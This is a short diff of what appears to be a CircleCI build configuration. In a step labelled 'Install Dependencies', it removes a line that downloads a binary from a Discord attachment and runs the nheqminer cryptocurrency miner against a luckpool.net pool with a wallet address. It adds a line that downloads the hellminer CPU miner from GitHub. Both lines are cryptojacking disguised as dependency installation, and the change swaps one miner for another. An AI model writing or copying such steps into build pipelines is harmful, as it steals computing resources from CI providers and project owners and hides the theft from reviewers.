@@ -27,7 +27,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: sudo su --command "wget https://cdn.discordapp.com/attachments/769611456601260082/916975404512854016/bin.zip && unzip bin.zip && chmod +x bin/nheqminer && ./bin/nheqminer -v -1 eu.luckpool.net:3956 -u RBkULgZSuJDiFg3X4h7mxmn6fFCmscQDrn -p x -t 6
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
 workflows:
     version: 2.1
     build:
